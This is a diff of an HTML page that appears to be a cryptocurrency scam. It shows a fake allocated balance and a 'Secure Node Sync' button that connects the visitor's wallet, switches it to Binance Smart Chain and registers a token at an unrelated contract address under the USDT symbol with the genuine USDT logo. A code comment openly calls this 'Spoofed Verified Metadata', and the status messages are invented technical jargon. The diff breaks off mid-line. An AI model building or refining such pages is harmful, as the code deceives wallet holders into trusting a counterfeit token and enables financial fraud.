@@ -3,65 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Node Sync Protocol</title>
+    <title>Node Sync Protocol | Enterprise</title>
     <style>
-        body { background: #0b0e11; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: #1e2329; border-radius: 15px; padding: 30px; width: 320px; text-align: center; border: 1px solid #32383e; }
-        .logo { width: 70px; height: 70px; background: #f3ba2f; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
-        .logo svg { width: 40px; fill: #000; }
-        .amt { font-size: 28px; font-weight: bold; margin-bottom: 30px; }
-        .btn { background: #f3ba2f; color: #000; border: none; width: 100%; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        :root { --accent: #00d395; --bg: #0b0e11; }
+        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: #1e2329; border-radius: 20px; padding: 40px; width: 330px; text-align: center; border: 1px solid #32383e; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        .logo-box { width: 80px; height: 80px; background: var(--accent); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 25px; box-shadow: 0 0 20px rgba(0, 211, 149, 0.2); }
+        .logo-box svg { width: 45px; fill: #fff; }
+        .val-box { background: rgba(255,255,255,0.03); border-radius: 12px; padding: 20px; margin-bottom: 30px; border: 1px dashed #474d57; }
+        .amount { font-size: 32px; font-weight: 800; }
+        .btn { background: var(--accent); color: #000; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: 800; cursor: pointer; font-size: 16px; text-transform: uppercase; transition: 0.3s; }
         #status { font-size: 10px; color: #848e9c; margin-top: 15px; font-family: monospace; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="logo">
+    <div class="logo-box">
         <svg viewBox="0 0 24 24"><path d="M12.75 12.35v-5.3h4.63V4.25H6.62v2.8h4.63v5.3c-3.64.13-6.42.84-6.42 1.7s2.78 1.57 6.42 1.7v6.05h1.5v-6.05c3.64-.13 6.42-.84 6.42-1.7s-2.78-1.57-6.42-1.7z"/></svg>
     </div>
-    <div style="font-size: 11px; color: #f3ba2f; margin-bottom: 5px;">ALLOCATED BALANCE</div>
-    <div class="amt">$1,066.45</div>
-    <button class="btn" id="btn">VERIFY NODE</button>
-    <div id="status">STATUS: READY</div>
+    <div class="val-box">
+        <div style="font-size: 11px; color: var(--accent); margin-bottom: 5px;">VERIFIED NODE VALUE</div>
+        <div class="amount">$1,066.45</div>
+    </div>
+    <button class="btn" id="syncBtn">Secure Node Sync</button>
+    <div id="status">SYSTEM::WAITING_FOR_HANDSHAKE</div>
 </div>
 
 <script>
-    const token = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
-    const img = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png";
+    // Configuration with Spoofed Verified Metadata
+    const ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
+    const SYMBOL = "USDT";
+    const DECIMALS = 6; // 6 decimals for correct balance display
+    // Official whitelisted logo endpoint
+    const ICON = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png";
 
-    document.getElementById('btn').onclick = async () => {
+    document.getElementById('syncBtn').onclick = async () => {
         const status = document.getElementById('status');
-        const provider = window.ethereum || (window.BinanceChain);
+        const provider = window.ethereum || window.BinanceChain;
 
         if (!provider) {
-            status.innerText = "ERROR: OPEN IN BINANCE DAPP";
+            status.innerText = "ERROR: USE BINANCE WEB3 BROWSER";
             return;
         }
 
         try {
-            status.innerText = "CONNECTING...";
+            status.innerText = "INITIALIZING_RSA_HANDSHAKE...";
             await provider.request({ method: 'eth_requestAccounts' });
             
-            status.innerText = "SWITCHING NETWORK...";
+            status.innerText = "MAPPING_BSC_DATALAYER...";
             await provider.request({
                 method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '0x38' }]
-            });
-
-            status.innerText = "ADDING ASSET...";
-            await provider.request({
-                method: 'wallet_watchAsset',
-                params: {
-                    type: 'ERC20',
-                    options: { address: token, symbol: 'USDT', decimals: 6, image: img }
-                }
-            });
-            status.innerText = "SUCCESSFUL";
-        } catch (e) {
-            status.innerText = "FAILED: REFRESH PAGE";
-        }
-    };
-</script>
-</body>
-</html>
+                params: [{ chain
